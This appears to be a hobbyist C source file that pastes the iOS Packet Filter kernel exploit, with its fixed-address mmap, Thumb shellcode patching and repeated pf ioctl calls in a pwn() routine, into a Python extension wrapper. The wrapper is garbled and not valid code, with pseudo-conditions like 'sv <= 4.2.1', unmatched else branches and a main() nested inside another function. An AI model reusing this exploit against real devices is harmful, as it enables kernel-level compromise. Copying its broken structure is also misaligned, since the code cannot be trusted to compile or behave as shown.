///Sourced from https://www.theiphonewiki.com/wiki/Packet_Filter_Kernel_Exploit
///And https://stackoverflow.com/questions/8728728/compiling-multiple-c-files-in-a-program
///And https://www.programiz.com/c-programming/c-if-else-statement
///And https://www.cprogramming.com/tutorial/c/lesson2.html
///And https://www.geeksforgeeks.org/goto-statement-in-c-cpp/

#include "systemversion.h"

static PyObject * pfke(PyObject * self) {
    if (sv <= 4.2.1)
      compatible_state == yes
    if compatible_state == yes
    goto exploit
    else
      printf("Error Code 003 Occured\n");
    exit(0);
    else
      printf("Error Code 004 Occured\n");
    exit(0);
    exploit:
      int main() {
        unsigned int target_addr = CONFIG_TARGET_ADDR;
        unsigned int target_addr_real = target_addr & ~1;
        unsigned int target_pagebase = target_addr & ~0xfff;
        unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
        assert(MAP_FAILED != mmap((void * ) target_pagebase, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
        unsigned short * p = (void * ) target_addr_real;
        if (target_addr_real & 2) * p++ = 0x46c0; // nop
        * p++ = 0x4b00; // ldr r3, [pc]
        * p++ = 0x4718; // bx r3
        *((unsigned int * ) p) = (unsigned int) & ok_go;
        assert(!mprotect((void * ) target_pagebase, 0x2000, PROT_READ | PROT_EXEC));

        // Yes, reopening is necessary
        pffd = open("/dev/pf", O_RDWR);
        ioctl(pffd, DIOCSTOP);
        assert(!ioctl(pffd, DIOCSTART));
        unsigned int sysent_patch = CONFIG_SYSENT_PATCH;
        while (num_decs--)
          pwn(sysent_patch + 3);
        assert(!ioctl(pffd, DIOCSTOP));
        close(pffd);

        assert(!mlock((void * )((unsigned int)( & ok_go) & ~0xfff), 0x1000));
        assert(!mlock((void * )((unsigned int)( & flush) & ~0xfff), 0x1000));
        assert(!mlock((void * ) target_pagebase, 0x2000));#
        ifdef DEBUG
        printf("ok\n");
        fflush(stdout);#
        endif
        syscall(0);#
        ifdef DEBUG
        printf("we're out\n");
        fflush(stdout);#
        endif
        //...
      }
    //...

    static void pwn(unsigned int addr) {
      struct pfioc_trans trans;
      struct pfioc_trans_e trans_e;
      struct pfioc_pooladdr pp;
      struct pfioc_rule pr;

      memset( & trans, 0, sizeof(trans));
      memset( & trans_e, 0, sizeof(trans_e));
      memset( & pr, 0, sizeof(pr));

      trans.size = 1;
      trans.esize = sizeof(trans_e);
      trans.array = & trans_e;
      trans_e.rs_num = PF_RULESET_FILTER;
      memset(trans_e.anchor, 0, MAXPATHLEN);
      assert(!ioctl(pffd, DIOCXBEGIN, & trans));
      u_int32_t ticket = trans_e.ticket;

      assert(!ioctl(pffd, DIOCBEGINADDRS, & pp));
      u_int32_t pool_ticket = pp.ticket;

      pr.action = PF_PASS;
      pr.nr = 0;
      pr.ticket = ticket;
      pr.pool_ticket = pool_ticket;
      memset(pr.anchor, 0, MAXPATHLEN);
      memset(pr.anchor_call, 0, MAXPATHLEN);

      pr.rule.return_icmp = 0;
      pr.rule.action = PF_PASS;
      pr.rule.af = AF_INET;
      pr.rule.proto = IPPROTO_TCP;
      pr.rule.rt = 0;
      pr.rule.rpool.proxy_port[0] = htons(1);
      pr.rule.rpool.proxy_port[1] = htons(1);

      pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
      pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;

      //offsetof(struct pfr_ktable, pfrkt_refcnt[PFR_REFCNT_RULE]) = 0x4a4
      pr.rule.overload_tbl = (void * )(addr - 0x4a4);

      errno = 0;

      assert(!ioctl(pffd, DIOCADDRULE, & pr));

      assert(!ioctl(pffd, DIOCXCOMMIT, & trans));

      pr.action = PF_CHANGE_REMOVE;
      assert(!ioctl(pffd, DIOCCHANGERULE, & pr));
    }
